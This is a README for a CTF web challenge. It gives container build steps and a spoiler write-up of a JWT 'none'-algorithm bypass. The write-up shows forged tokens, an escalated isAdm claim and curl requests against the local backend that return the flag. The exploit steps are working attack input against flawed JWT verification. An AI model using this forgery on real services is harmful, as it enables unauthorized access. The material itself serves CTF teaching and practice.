# Application Ointment

![Main screen](assets/screen1.png)

An <ins>easier difficulty web</ins> challenge where the site is pretty simplistic. Basically one can find a bunch of minfied JavaScript content, a login page that only needs a username field and some animations + music.

## How to run

The image was tested with podman, but should work fine with docker as well.

0. Clone the repo and cd to the root folder of the particular challenge
1. Export the current working directory as a variable: `export CTF_APPLICATION_OINTMENT=$PWD`
2. Build the backend: `cd $CTF_APPLICATION_OINTMENT/backend && ./build.sh build` _(**NOTE**: the build argument is important, otherwise the image won't be prepared)_
3. Build the frontend: `cd $CTF_APPLICATION_OINTMENT/frontend && ./build.sh build`
4. Package and build the final container: `podman build -t ctf-application_ointment:latest .`
5. Run it: `podman rm -f appointment; podman run -d --name=appointment -p 8080:8080 -p 1337:1337 -v $PWD/logs:/var/log/apache2 ctf-application_ointment:latest`

The challenge uses two ports. By default 8080/tcp is used by Apache to serve a static Svelte based frontend and port 1337/tcp is occupied by a pure Go based backend. You are free to change the exposed frontend port, but the backend port is hardcoded, therefore you need to change the sources at the following places:

- [supervisord.conf#L12](supervisord.conf#L12)
- [frontend/src/routes/+page.svelte#L5](frontend/src/routes/+page.svelte#L5)

Also make sure to rebuild both the frontend and the backend + the final container after changing the port!

<details>
<summary>Writeup (Spoiler)</summary>

The challenge idea is nothing unique, it was inspired by the numerous JWT None exploitation writeups out there you find on Google. One such example can be found [here](https://medium.com/@phosmet/forging-jwt-exploiting-the-none-algorithm-a37d670af54f). So the whole challenge is about forging a JWT.

_tldr_ on the exploit: A JWT token consists of three base64 encoded parts joint together with a dot. The first part is the header, the second is the payload and the third is the signature. The header and the payload are JSON objects. And the last bit is usually a signature generated from the header and the payload using a secret key. The hashing algorithm is specified in the header. The header is usually something like this:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

So in that case HMAC-SHA256 is used to generate the signature. But the JWT specification allows the use of the `none` algorithm, which means that no signature is generated or verified. As far as I know, this was intended for cases where the authenticity of the client was already verified beforehand. In this case no signature is verified.

-- _tldr ends_

Since this is a well-known vulnerability, I wanted to spice things up a little so they need to work a little bit to obtain the flag.

Open up the frontend in a regular web browser and find a login screen. Play around with test inputs and figure that it returns

> Invalid username

for most inputs. When entering the username `admin`, we even get a little easter egg sound effect in the form of a sad trombone. We have a bunch of minified JavaScript files to begin with, which handle a lot of animations and rendering, but if we inspect on the input field, we will see that it has two events attached to it:

![Inspect element display on the username input field](assets/screen2.png)

Jump to the function and either scroll up or add a breakpoint and start typing in the input field. You will shortly be able to intercept a debug message that's being logged to the console when someone enters a correct username:

![Valid usernames found](assets/screen3.png)

So now we have the username. I will stick with `egon` in the writeup, but any will do. Enter that to the textbox and notice this in the console:

> [DEBUG] username seems valid

Click on submit, which should send a POST request along with an url-encoded form of the given username to the backend. The backend then returns something like:

```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImVnb24iLCJpc0FkbSI6MCwiZXhwIjoxNjk1MTU2NDA4fQ.VIu1YHytDxsQRQWtXBxskWJyz9myH-PsgZrQET2BazE", "exp": 1695156408}
```

[JWT.io](https://jwt.io/) is a handy website to decode and encode JWT tokens. If we paste the token there, we can see that the payload is:

```json
{
  "username": "egon",
  "isAdmin": 0,
  "exp": 1695156408
}
```

While the header should be as follows:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

So take `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`, decode it using your base64 decoder of choice eg. CyberChef, and get the following: `{"alg":"HS256","typ":"JWT"}`. Now replace `HS256` with `none` or `None` (case shouldn't matter), so we get `{"alg":"none","typ":"JWT"}`. Encode it back to base64 and make sure to get rid of the padding `=` signs if there are any. Now we have `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`.

Optionally let's confirm that we can now bypass the signature verification. First I will make a request with the original token:

```
[steve@todo ctf-application_ointment]$ curl http://127.0.0.1:1337/appointments -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImVnb24iLCJpc0F
kbSI6MCwiZXhwIjoxNjk1MTU2NDA4fQ.VIu1YHytDxsQRQWtXBxskWJyz9myH-PsgZrQET2BazE"
{"error": "Token is expired"}
```

The token was valid for 10 minutes and so its already expired as of time of trying.

If I now invalidate the signature by removing the last character of the token, I get the following:

```
[steve@todo ctf-application_ointment]$ curl http://127.0.0.1:1337/appointments -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImVnb24iLCJpc0FkbSI6MCwiZXhwIjoxNjk1MTU2NDA4fQ.VIu1YHytDxsQRQWtXBxskWJyz9myH-PsgZrQET2Baz"
{"error": "signature is invalid"}
```

Now we know its indeed verified. But what about the `none` algorithm we examined earlier? So for that I will change the content before the first `.` from `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` to `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`. I already explained earlier why. Now it's time to test it:

```
[steve@todo ctf-application_ointment]$ curl http://127.0.0.1:1337/appointments -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImVnb24iLCJpc0FkbSI6MCwiZXhwIjoxNjk1MTU2NDA4fQ.VIu1YHytDxsQRQWtXBxskWJyz9myH-PsgZrQET2BazE"
{"appointments": [{"name":"Bust the Ghostly Buffet Bash","date":1677158400},{"name":"Ecto-1 Parade Extravaganza","date":1677244800},{"name":"Slimer's All-You-Can-Slime Buffet","date":1677331200},{"name":"Proton Pack Painting Party","date":1677417600},{"name":"Ghostbusters Trivia Night","date":1677504000},{"name":"Stay Puft Marshmallow Roast","date":1677590400}]}
```

Wild! This means that it treated us logged in with a forged token. In fact you can even completely omit the part after the second dot or replace the whole garbage with `cheesecake` and it will still work. But we are back to the point what we already had on the site...

Time to take a look at the second part of the JWT, which is the claims/payload. Decoding `eyJ1c2VybmFtZSI6ImVnb24iLCJpc0FkbSI6MCwiZXhwIjoxNjk1MTU2NDA4fQ` gets us to `{"username":"egon","isAdm":0,"exp":1695156408}`. If we roll our luck, flip `isAdm` to 1, reencode the payload and send it to the backend, we get the following:

```
[steve@todo ctf-application_ointment]$ curl http://127.0.0.1:1337/appointments -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImVnb24iLCJpc0FkbSI6MSwiZXhwIjoxNjk1MTU2NDA4fQ.VIu1YHytDxsQRQWtXBxskWJyz9myH-PsgZrQET2BazE"
{"appointments": [{"name":"Bust the Ghostly Buffet Bash","date":1677158400},{"name":"Ecto-1 Parade Extravaganza","date":1677244800},{"name":"Slimer's All-You-Can-Slime Buffet","date":1677331200},{"name":"Proton Pack Painting Party","date":1677417600},{"name":"Ghostbusters Trivia Night","date":1677504000},{"name":"Stay Puft Marshmallow Roast","date":1677590400}, {"name":"cq23{g0tta_c4tch_th3m_4ll_6d8441095772cfcf12a846450d}","date":1677676800}]}
```

And that's our flag for the win!

I have prepared a poc script that does the whole thing for you. It's available [here](poc.py).

### Things to consider fixing
- Check if username is valid in case of the `none` algorithm
- I was lazy to find a vulnerable JWT library, so I implemented some sort of check in Go myself. Maybe research a bit more and find a vulnerable library?
- aria-label on back arrow
- resize all assets to 100x100px
- add/remove favicon
- Maybe instead of isAdm in claims, have it working with username: admin? Would that be too much guessing?
- I used Apache to serve the frontend so it's not always nginx. Maybe we can downgrade to some older version of Apache that has a known vulnerabilities, disable the features that are vulnerable and expose the server version in the response headers, so the attacker's attention gets diverted to Apache instead of the JWT? Is that too evil? 
</details>